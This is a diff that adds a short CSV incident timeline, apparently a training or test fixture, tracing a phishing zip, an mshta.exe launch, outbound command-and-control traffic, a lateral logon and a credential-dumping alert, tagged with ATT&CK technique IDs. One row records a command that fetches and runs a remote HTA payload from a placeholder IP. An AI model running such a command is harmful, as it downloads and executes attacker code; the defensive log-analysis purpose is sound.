@@ -1,0 +1,6 @@
+timestamp,host,source,technique,summary,artifact_ref,precision
+2026-11-20T08:14:22Z,ws-fin-04.corp.example,Email gateway,T1566.001,User received Invoice_882.zip from billing@mail.example,mail-7781,second
+2026-11-20T08:16:05Z,ws-fin-04.corp.example,Sysmon 1,T1204.002,explorer.exe started mshta.exe http://192.0.2.10/payload.hta,sysmon-1123,second
+2026-11-20T08:16:09Z,ws-fin-04.corp.example,Proxy,T1071.001,Outbound TLS to c2.example.net,proxy-99,second
+2026-11-20T09:15:10Z,srv-file-02.corp.example,Windows Security 4624,T1021.002,Network logon with svc_backup,sec-4624-1,second
+2026-11-21T10:00:00+01:00,edr-console.corp.example,EDR,,Alert raised on ws-fin-04 for credential dumping,edr-55,minute
